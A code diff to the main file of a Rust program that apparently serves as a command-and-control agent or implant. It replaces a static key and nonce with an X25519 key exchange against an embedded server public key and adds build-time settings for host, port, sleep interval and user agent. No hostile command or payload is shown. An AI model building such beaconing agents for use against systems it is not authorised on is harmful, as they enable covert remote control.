@@ -1,3 +1,5 @@
+use x25519_dalek::PublicKey;
+
 pub mod core;
 pub mod config;
 pub mod crypto;
@@ -9,18 +11,31 @@ use core::run_linux::run;
 use core::run_windows::run;
 
 use config::config::Config;
+use crypto::aesgcm::{AES_GCM_KEY_LENGTH, decode, derive_shared_secret, generate_keypair, vec_u8_to_u8_32};
 
 include!(concat!(env!("OUT_DIR"), "/init.rs"));
 
 #[tokio::main]
 async fn main() {
-    let (proto, host, port, sleep, key, nonce) = init();
+    let (proto, host, port, sleep, user_agent, server_public_key) = init();
+
+    let server_public_key = decode(server_public_key.as_bytes());
+    let server_public_key = vec_u8_to_u8_32(server_public_key).unwrap();
+    let server_public_key = PublicKey::from(server_public_key);
+
+    let (my_secret_key, my_public_key) = generate_keypair();
+    let shared_secret = derive_shared_secret(my_secret_key.clone(), server_public_key.clone());
+
     let config = Config::new(
         proto.to_string(),
         host.to_string(),
         port,
         sleep,
-        key.to_string(),
-        nonce.to_string());
+        user_agent.to_string(),
+        server_public_key,
+        my_secret_key,
+        my_public_key,
+        shared_secret,
+    );
     run(config).await.unwrap()
 }
